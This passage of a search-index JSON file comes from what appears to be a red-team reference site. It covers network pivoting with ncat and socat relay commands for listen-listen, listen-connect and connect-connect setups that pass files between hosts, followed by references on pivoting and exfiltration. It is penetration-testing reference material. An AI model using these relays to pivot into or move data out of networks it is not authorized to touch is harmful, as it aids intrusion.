connect to bridge two hosts"},{"location":"redteam/pivoting/network-pivoting-techniques/#listen-listen","title":"Listen - Listen","text":"Type Use Case ncat <code>ncat -v -l -p 8080 -c \"ncat -v -l -p 9090\"</code> socat <code>socat -v tcp-listen:8080 tcp-listen:9090</code> remote host 1 <code>ncat localhost 8080 &lt; file</code> remote host 2 <code>ncat localhost 9090 &gt; newfile</code>"},{"location":"redteam/pivoting/network-pivoting-techniques/#listen-connect","title":"Listen - Connect","text":"Type Use Case ncat <code>ncat -l -v -p 8080 -c \"ncat localhost 9090\"</code> socat <code>socat -v tcp-listen:8080,reuseaddr tcp-connect:localhost:9090</code> remote host 1 <code>ncat localhost -p 8080 &lt; file</code> remote host 2 <code>ncat -l -p 9090 &gt; newfile</code>"},{"location":"redteam/pivoting/network-pivoting-techniques/#connect-connect","title":"Connect - Connect","text":"Type Use Case ncat <code>ncat localhost 8080 -c \"ncat localhost 9090\"</code> socat <code>socat -v tcp-connect:localhost:8080,reuseaddr tcp-connect:localhost:9090</code> remote host 1 <code>ncat -l -p 8080 &lt; file</code> remote host 2 <code>ncat -l -p 9090 &gt; newfile</code>"},{"location":"redteam/pivoting/network-pivoting-techniques/#references","title":"References","text":"<ul> <li>Port Forwarding in Windows - Windows OS Hub</li> <li>Using the SSH \"Konami Code\" (SSH Control Sequences) - Jeff McJunkin</li> <li>A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko</li> <li>Pivoting Meterpreter</li> <li>\ud83c\uddeb\ud83c\uddf7 Etat de l\u2019art du pivoting r\u00e9seau en 2019 - Oct 28,2019 - Alexandre ZANNI - \ud83c\uddfa\ud83c\uddf8 Overview of network pivoting and tunneling [2022 updated] - Alexandre ZANNI</li> <li>Red Team: Using SharpChisel to exfil internal network - Shantanu Khandelwal - Jun 8</li> <li>Active Directory - hideandsec</li> <li>Windows: Capture a network trace with builtin tools (netsh) - February 22, 2021 Michael Albert</li> </ul>"}]}